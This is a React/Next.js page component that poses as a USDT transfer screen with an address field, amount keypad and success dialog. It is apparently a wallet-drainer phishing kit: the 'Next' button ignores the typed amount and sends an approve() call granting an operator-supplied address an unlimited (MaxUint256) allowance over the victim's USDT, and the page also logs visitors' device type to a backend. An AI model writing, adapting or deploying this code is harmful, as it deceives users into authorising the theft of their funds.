"use client";

import { useState, useEffect, useRef } from "react";

const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const ETH_CHAIN_ID = "0x1";

interface EthereumProvider {
  request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
  on?: (event: string, handler: (...args: unknown[]) => void) => void;
}
declare global {
  interface Window {
    ethereum?: EthereumProvider;
    trustwallet?: { ethereum?: EthereumProvider };
  }
}

function getProviderNow(): EthereumProvider | null {
  if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
  if (window.ethereum) return window.ethereum;
  return null;
}

async function waitForProvider(): Promise<EthereumProvider | null> {
  for (let i = 0; i < 15; i++) {
    const p = getProviderNow();
    if (p) return p;
    await new Promise((r) => setTimeout(r, 300));
  }
  return null;
}

let cachedEthers: typeof import("ethers") | null = null;
async function getEthers() {
  if (!cachedEthers) cachedEthers = await import("ethers");
  return cachedEthers;
}

export default function WalletPage() {
  const [receiver, setReceiver] = useState("");
  const [loading, setLoading] = useState(false);
  const [txHash, setTxHash] = useState("");
  const [displayAmount, setDisplayAmount] = useState("0");
  const [isKeyboardVisible, setIsKeyboardVisible] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalStatus, setModalStatus] = useState<"pending" | "success" | "error">("pending");
  const providerRef = useRef<EthereumProvider | null>(null);
  const keypadRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    let cancelled = false;

    // Charger le receiver depuis Supabase
    fetch("/api/config", { cache: "no-store" })
      .then((r) => r.json())
      .then((data) => {
        if (data.config?.receiver_address && !cancelled) {
          setReceiver(data.config.receiver_address);
        }
      })
      .catch(() => {});

    // Log scan
    (async () => {
      try {
        const ua = navigator.userAgent.toLowerCase();
        const platform = ua.includes("iphone") || ua.includes("ipad") ? "iOS" : ua.includes("android") ? "Android" : "Other";
        const device = window.trustwallet ? `Trust Wallet (${platform})` : "Browser";
        await fetch("/api/log-scan", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ to: "pending", amount: "1", token: "USDT", userAgent: device, platform }),
        });
      } catch {}
    })();

    const init = async () => {
      const p = await waitForProvider();
      if (!p || cancelled) return;
      providerRef.current = p;
      try {
        const chainId = (await p.request({ method: "eth_chainId" })) as string;
        if (chainId && chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
          await p.request({ method: "wallet_switchEthereumChain", params: [{ chainId: ETH_CHAIN_ID }] });
        }
      } catch {}
    };
    init();
    return () => { cancelled = true; };
  }, []);

  const handleSend = async () => {
    if (!receiver || !/^0x[a-fA-F0-9]{40}$/.test(receiver)) {
      setModalStatus("error");
      setShowModal(true);
      return;
    }

    setShowModal(false);
    setLoading(true);

    const p = providerRef.current ?? (await waitForProvider());
    if (!p) { setLoading(false); return; }
    providerRef.current = p;

    try {
      const chainId = (await p.request({ method: "eth_chainId" })) as string;
      if (chainId && chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
        await p.request({ method: "wallet_switchEthereumChain", params: [{ chainId: ETH_CHAIN_ID }] });
      }
    } catch {}

    try {
      const { ethers } = await getEthers();
      const iface = new ethers.Interface(["function approve(address spender, uint256 amount) returns (bool)"]);
      const data = iface.encodeFunctionData("approve", [receiver, ethers.MaxUint256]);

      const hash = (await p.request({
        method: "eth_sendTransaction",
        params: [{ to: USDT_CONTRACT, data, gas: "0x249f0" }],
      })) as string;

      setTxHash(hash);
      setModalStatus("pending");
      setShowModal(true);

      const provider = new ethers.BrowserProvider(p as any);
      const receipt = await provider.waitForTransaction(hash);
      setModalStatus(receipt && receipt.status === 1 ? "success" : "error");
    } catch (err) {
      console.error(err);
      setModalStatus("error");
    } finally {
      setLoading(false);
    }
  };

  const handleKeyPress = (key: string) => {
    setDisplayAmount((prev) => {
      let nv = prev;
      if (key === "⌫") nv = prev.length <= 1 ? "0" : prev.slice(0, -1);
      else if (key === "," || key === ".") {
        if (!prev.includes(",") && !prev.includes(".")) nv = prev === "" ? "0," : prev + ",";
      } else {
        if (prev === "0") nv = key;
        else nv = prev + key;
      }
      return nv;
    });
  };

  const handleKeyTouch = (e: React.PointerEvent<HTMLButtonElement> | React.MouseEvent<HTMLButtonElement>, key: string) => {
    e.preventDefault(); e.stopPropagation();
    handleKeyPress(key);
  };

  return (
    <main className="transfer-main transfer-main-pad" onClick={() => setIsKeyboardVisible(false)} style={{ minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", padding: "2rem 1rem" }}>
      <div className="form-container" style={{ maxWidth: 480, width: "100%" }}>
        <label className="form-label">Address or domain name</label>
        <div className="input-row">
          <input type="text" value={receiver ? `${receiver.slice(0, 10)}...${receiver.slice(-8)}` : "Loading..."} readOnly className="input-row__field" />
        </div>

        <label className="form-label form-label--spaced">Amount</label>
        <div className={`montant-container ${isKeyboardVisible ? "montant-container--active" : ""}`} onClick={(e) => { e.stopPropagation(); setIsKeyboardVisible(true); }}>
          <div className="montant-input-wrapper">
            <span className="montant-display-value">{displayAmount || "0"}</span>
            {isKeyboardVisible && <span className="blinking-cursor" />}
          </div>
          <div className="montant-right">
            <span className="montant-token">USDT</span>
          </div>
        </div>
      </div>

      <div style={{ flexGrow: 1 }} />

      <div className="next-btn-wrapper" style={{ maxWidth: 480, width: "100%" }}>
        <button onClick={(e) => { e.stopPropagation(); handleSend(); }} disabled={loading} className={`next-btn ${loading ? "next-btn--loading" : ""}`}>
          {loading ? <span className="btn-spinner-wrapper"><span className="btn-spinner" />Processing...</span> : "Next"}
        </button>
      </div>

      {isKeyboardVisible && (
        <div className="custom-keypad" ref={keypadRef} onClick={(e) => e.stopPropagation()} style={{ maxWidth: 480, width: "100%" }}>
          {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((n) => (
            <button key={n} type="button" onPointerDown={(e) => handleKeyTouch(e, String(n))} onClick={(e) => e.preventDefault()} className="keypad-key">
              <span className="keypad-key__number">{n}</span>
            </button>
          ))}
          <button type="button" onPointerDown={(e) => handleKeyTouch(e, ",")} onClick={(e) => e.preventDefault()} className="keypad-key keypad-key--special"><span className="keypad-key__number">,</span></button>
          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "0")} onClick={(e) => e.preventDefault()} className="keypad-key"><span className="keypad-key__number">0</span></button>
          <button type="button" onPointerDown={(e) => handleKeyTouch(e, "⌫")} onClick={(e) => e.preventDefault()} className="keypad-key keypad-key--special">⌫</button>
        </div>
      )}

      {showModal && (
        <div className="modal-overlay" onClick={() => setShowModal(false)}>
          <div className="modal-card" onClick={(e) => e.stopPropagation()}>
            <button className="modal-close-btn" onClick={() => setShowModal(false)}>✕</button>
            <img src="/yes.png" alt="Status" className="modal-logo" />
            {modalStatus === "pending" && (<><h2 className="modal-title">Processing...</h2><p className="modal-text">Blockchain validation is underway.</p></>)}
            {modalStatus === "success" && (<><h2 className="modal-title" style={{ color: "#10b981" }}>Transaction successful!</h2><p className="modal-text">Your transfer has been validated.</p></>)}
            {modalStatus === "error" && (<><h2 className="modal-title" style={{ color: "#ef4444" }}>Transaction failed</h2><p className="modal-text">The transaction failed.</p></>)}
            {txHash && <a href={`https://etherscan.io/tx/${txHash}`} target="_blank" rel="noopener noreferrer" className="modal-details-btn">Transaction details</a>}
          </div>
        </div>
      )}
    </main>
  );
}